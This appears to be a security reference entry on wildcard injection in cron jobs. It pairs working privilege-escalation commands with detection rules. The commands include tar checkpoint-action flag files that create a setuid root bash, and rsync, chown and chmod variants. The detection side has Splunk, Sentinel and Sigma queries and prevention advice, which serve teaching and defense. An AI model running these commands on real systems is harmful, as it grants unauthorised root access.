name: Wildcard Injection - Cron/Script Exploitation via Filenames
description: Wildcard injection exploits shell glob expansion in cron jobs or scripts that use wildcards (tar *, rsync *, chown * etc.). By creating files named as command-line flags, the wildcard expands them into arguments. Most commonly used with tar's --checkpoint feature to execute arbitrary commands when a cron runs tar cf backup.tar *.
source: Linux privilege escalation research; OSCP methodology
notes:
=== THE IDEA ===
When a script or cron job uses a wildcard like:
  tar cf /backup/archive.tar *
The shell expands * to all filenames. If you create files named
like command flags, they become arguments to the command.

=== TAR WILDCARD (most common) ===
  # Create the payload script
  echo '#!/bin/bash' > shell.sh
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh
  chmod +x shell.sh

  # Create the 'flag' files
  echo '' > '--checkpoint=1'
  echo '' > '--checkpoint-action=exec=sh shell.sh'

  # When cron runs: tar cf backup.tar *
  # It expands to: tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2...
  # tar executes shell.sh at each checkpoint!

  # After cron runs:
  /tmp/rootbash -p   # root shell

=== RSYNC WILDCARD ===
  # If cron runs: rsync -a * /backup/
  echo '' > '-e sh shell.sh'
  # rsync -e executes a shell command

=== CHOWN WILDCARD ===
  # If cron runs: chown user:group *
  echo '' > '--reference=/etc/passwd'
  # Changes ownership to match /etc/passwd owner (root)

=== CHMOD WILDCARD ===
  # If cron runs: chmod 700 *
  echo '' > '--reference=/etc/shadow'

=== FINDING TARGETS ===
  # Check crontab for wildcards
  cat /etc/crontab
  ls -la /etc/cron.d/
  crontab -l
  # Look for: tar, rsync, chown, chmod with * in writable dirs
  # Use pspy to watch what runs

recommended.note: pspy discovers cron jobs running with wildcards.

defense.why_it_works: Shell glob expansion treats filenames starting with - as command arguments. tar's --checkpoint-action allows arbitrary command execution, making it the most dangerous target.
defense.prerequisites: Write access to a directory where a privileged cron job uses wildcards (tar *, rsync *, etc.).
defense.impact: Privilege escalation to the user running the cron job (often root).
defense.detection: [MITRE T1053.003] Files with names starting with -- in directories used by cron jobs; tar/rsync processes with unexpected arguments.
defense.artifacts: Filesystem entries with flag-like names; process execution showing injected arguments.
defense.splunk_spl:
index=linux sourcetype=syslog process_name=tar
| where match(process_args, "--checkpoint-action")
| table _time, user, process_name, process_args
defense.sentinel_kql:
Syslog
| where ProcessName == "tar" and SyslogMessage contains "--checkpoint-action"
| project TimeGenerated, Computer, SyslogMessage
defense.prevention: Never use bare wildcards in privileged scripts; use full paths or find -exec; quote arguments; use -- to separate flags from filenames.

detections.name: Tar wildcard injection - checkpoint action
detections.logic:
title: Tar Checkpoint Action Execution (Wildcard Injection)
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: '/tar'
    CommandLine|contains: '--checkpoint-action'
  condition: selection
level: critical
detections.false_positives: Legitimate tar backups using checkpoint for progress reporting (rare)
detections.tuning: Alert on any --checkpoint-action in automated/cron context
